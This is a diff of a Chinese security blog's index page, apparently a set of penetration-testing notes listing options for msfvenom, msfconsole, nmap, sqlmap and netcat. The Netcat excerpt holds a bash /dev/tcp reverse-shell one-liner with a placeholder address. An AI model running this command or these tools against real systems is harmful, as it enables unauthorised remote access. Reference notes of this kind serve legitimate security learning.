+–sec name生成大型Windows二进制文件时要使用的新节名。默认值：随机4个字符的alpha字符串
+–使用所有可用编码器生成尽可能最小的有效负载
+–encrypt要应用于外壳代码的加密或编 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/11/15/Msfconsole/" title="Msfconsole"><img class="post_bg" src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Msfconsole"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/15/Msfconsole/" title="Msfconsole">Msfconsole</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-11-15T00:55:36.000Z" title="发表于 2021-11-15 08:55:36">2021-11-15</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">渗透工具</a></span></div><div class="content">MsfconsoleMsfconsole初始化参数：
+-E、 –环境环境设置Rails环境，默认为RAIL_ENV环境变量或“production”
+-M、 –迁移路径目录指定包含其他数据库迁移的目录
+-n、 –无数据库禁用数据库支持
+-y、 –yaml PATH指定包含数据库设置的yaml文件
+-c文件加载指定的配置文件
+-v、 -v，–version显示版本
+–defer-module-loads –延迟模块加载延迟模块加载，除非明确要求
+-m、 –模块路径目录加载其他模块路径
+-a、 –退出Metasploit前询问或接受“退出-y”
+-H、 –历史记录文件将命令历史记录保存到指定文件
+-l、 –记录器字符串指定要使用的记录器（Flatfile、StdoutWithoutTimestamps、Stderr、Stdout
+z`TimestampColorlessFlatfile）
+-L,   –real readline使用系统readline库而不是RbReadline
+-o、 –输出文件输出到指定的文件
+-p、 –插件启动时加载插件
+-q、 –启动时不要打印横幅
+-r、 –资源 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/11/12/nmap%E5%B7%A5%E5%85%B7/" title="nmap扫描"><img class="post_bg" src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="nmap扫描"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/12/nmap%E5%B7%A5%E5%85%B7/" title="nmap扫描">nmap扫描</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-11-12T02:39:57.000Z" title="发表于 2021-11-12 10:39:57">2021-11-12</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">渗透工具</a></span></div><div class="content">NmapNmap参数：
+-A #进行综合性扫描       -O #进行系统版本扫描       -p #指定端口扫描       -v #显示扫描过程       -e #指定网卡进行扫描       -T #加速扫描过程，默认时序4，最高为6       -n #不进行dns解析       -Pn #不进行ping扫描       -sP #判断主机存活       -sS #SYN半连接扫描探测端口开放状态       -sV #进行服务版本扫描       -sX #圣诞树扫描       -sF FIN扫描       -sU #使用UDP扫描方式确定UDP端口状态       -sT #TCP端口扫描       -sW #滑动窗口扫描       -sO #主机协议扫描       -sL #dns反向解析       -sR #RPC扫描       -sL #完全隐藏扫描       -sn #只进行主机发现，不进行端口扫描       -oX #将扫描结果生成xml文件       -iL #指定文本文件扫描
+Nmap脚本扫描：
+脚本存放路径：/usr/share ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/" title="sqlmap工具"><img class="post_bg" src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="sqlmap工具"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/12/sqlmap%E5%B7%A5%E5%85%B7/" title="sqlmap工具">sqlmap工具</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-11-12T00:17:08.000Z" title="发表于 2021-11-12 08:17:08">2021-11-12</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">渗透工具</a></span></div><div class="content">SQLmap：SQLmap参数：
+-u  URL=URL目标URL
+-r 通过文本来进行探测（抓取数据复制到文本）
+-g Google dork将Google dork结果处理为目标URL
+–data=DATA 通过POST发送的数据字符串（例如“id=1”）
+–cookie=cookie HTTP cookie头值（例如“PHPSESSID=a8d127e..”）
+ –random-agent  随机代理使用随机选择的HTTP用户代理头值
+ –proxy=PROXY  代理使用代理连接到目标URL
+ –level=LEVEL  要执行的测试级别（1-5，默认为1）
+(指定Level进行探测爆破(不加等级时，默认1,最高是5):
+level 1 (不添加时默认)
+level 2 (测试HTTP和cookie)
+level 3 (测试HTTP user-agent/referer)
+不确定payload或那个参数是注入点
+用越高的level探测，时间相对也会长）
+ –risk=RISK 风险=执行测试的风险（1-3，默认值1）
+ -b, –banner         标题检索DBMS标 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/11/10/netcat%E5%B7%A5%E5%85%B7/" title="Netcat工具"><img class="post_bg" src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Netcat工具"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/11/10/netcat%E5%B7%A5%E5%85%B7/" title="Netcat工具">Netcat工具</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2021-11-10T00:34:32.000Z" title="发表于 2021-11-10 08:34:32">2021-11-10</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">渗透工具</a></span></div><div class="content">NetcatNetcat参数：
+
+-c shell命令为“-e”；使用/bin/sh执行
+-e 文件名连接后要执行的程序
+-b 允许广播
+-g 网关源路由跃点，最多8个
+-G num源路由指针：4，8，12
+-l 侦听模式，用于入站连接
+-n 仅数字IP地址，无DNS
+-o 文件十六进制流量转储
+-p 端口本地端口号
+-r 随机化本地和远程端口
+-q 秒在标准DIN上的EOF和秒延迟后退出
+-s 地址本地源地址
+-T tos集合服务类型
+-u UDP模式
+-v verbose[使用两次更详细]
+-C 发送CRLF作为行结束
+-z 零I/O模式[用于扫描]
+
+Netcat常见使用方法：
+
+监听本地端口，以详细列出
+格式：nc -lvvp [Port]
+
+
+
+扫描目标指定端口范围开放状态
+格式：nc -v -z [Ip] [Port] 
+
+
+
+UDP扫描端口并返回端口信息
+格式：nc -v -z -u [Ip] [Port]
+
+
+
+在目标机没有nc的情况下
+格式：bash -i >&amp; /dev/tcp/Ip/Port 0>&amp;1
+
+本地机：
+
+目标机：
+
+
+windows下反 ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/Pictrue.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Pokerface</div><div class="author-info__description">花有重开日，人无再少年。</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Pokerface927"><i class="fab fa-github"></i><span>Github</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/Pokerface927" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">欢迎到访博客.</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/12/14/hydra/" title="hydra"><img src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hydra"/></a><div class="content"><a class="title" href="/2021/12/14/hydra/" title="hydra">hydra</a><time datetime="2021-12-14T12:47:04.000Z" title="发表于 2021-12-14 20:47:04">2021-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8A%A0%E5%9B%BA/" title="数据库加固"><img src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="数据库加固"/></a><div class="content"><a class="title" href="/2021/11/19/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8A%A0%E5%9B%BA/" title="数据库加固">数据库加固</a><time datetime="2021-11-19T00:11:35.000Z" title="发表于 2021-11-19 08:11:35">2021-11-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/18/iptables/" title="iptables"><img src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="iptables"/></a><div class="content"><a class="title" href="/2021/11/18/iptables/" title="iptables">iptables</a><time datetime="2021-11-18T00:13:25.000Z" title="发表于 2021-11-18 08:13:25">2021-11-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/17/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE/" title="密码策略配置"><img src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="密码策略配置"/></a><div class="content"><a class="title" href="/2021/11/17/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5%E9%85%8D%E7%BD%AE/" title="密码策略配置">密码策略配置</a><time datetime="2021-11-17T02:13:49.000Z" title="发表于 2021-11-17 10:13:49">2021-11-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/15/Msfvenom/" title="Msfvenom"><img src="/img/tag.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Msfvenom"/></a><div class="content"><a class="title" href="/2021/11/15/Msfvenom/" title="Msfvenom">Msfvenom</a><time datetime="2021-11-15T03:25:23.000Z" title="发表于 2021-11-15 11:25:23">2021-11-15</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+            </div>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"><span class="card-category-list-name">密码爆破</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E7%AD%96%E7%95%A5/"><span class="card-category-list-name">密码策略</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8A%A0%E5%9B%BA/"><span class="card-category-list-name">数据库加固</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%B8%97%E9%80%8F/"><span class="card-category-list-name">渗透</span><span class="card-category-list-count">5</span></a></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5/" style="font-size: 1.1em; color: #999">安全策略</a> <a href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" style="font-size: 1.5em; color: #99a9bf">渗透工具</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/12/"><span class="card-archive-list-date">十二月 2021</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2021/11/"><span class="card-archive-list-date">十一月 2021</span><span class="card-archive-list-count">8</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">9</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2021-12-04T16:00:00.000Z"></div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">4.2k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2021-12-15T07:13:40.713Z"></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Pokerface</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
   }
-</script>
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function subtitleType () {
+  fetch('https://v1.hitokoto.cn')
+    .then(response => response.json())
+    .then(data => {
+      if (true) {
+        const from = '出自 ' + data.from
+        const sub = []
+        sub.unshift(data.hitokoto, from)
+        window.typed = new Typed('#subtitle', {
+          strings: sub,
+          startDelay: 300,
+          typeSpeed: 150,
+          loop: true,
+          backSpeed: 50,
+        })
+      } else {
+        document.getElementById('subtitle').innerHTML = data.hitokoto
+      }
+    })
+}
 
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Pokerface"
-      src="/images/avatar.gif">
-  <p class="site-author-name" itemprop="name">Pokerface</p>
-  <div class="site-description" itemprop="description">花有重开日，人无再少年。</div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">7</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-            <a href="/categories/">
-          
-        <span class="site-state-item-count">2</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-            <a href="/tags/">
-          
-        <span class="site-state-item-count">2</span>
-        <span class="site-state-item-name">标签</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-        <a href="https://github.com/pokerface927" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;pokerface927" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:codepoker@163.com" title="E-Mail → mailto:codepoker@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="https://weibo.com/yourname" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="https://plus.google.com/yourname" title="Google → https:&#x2F;&#x2F;plus.google.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-google fa-fw"></i>Google</a>
-      </span>
-  </div>
-
-
-
-      </div>
-
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2021</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Pokerface</span>
-</div>
-
-<!--
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
-  </div>-->
-
-        
-
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-  <script defer src="/lib/three/three.min.js"></script>
-    <script defer src="/lib/three/canvas_sphere.min.js"></script>
-
-
-  
-
-
-
-
-  
-<script src="/js/local-search.js"></script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-</body>
-</html>
+if (true) {
+  if (typeof Typed === 'function') {
+    subtitleType()
+  } else {
+    getScript('https://cdn.jsdelivr.net/npm/typed.js/lib/typed.min.js').then(subtitleType)
+  }
+} else {
+  subtitleType()
+}
+</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
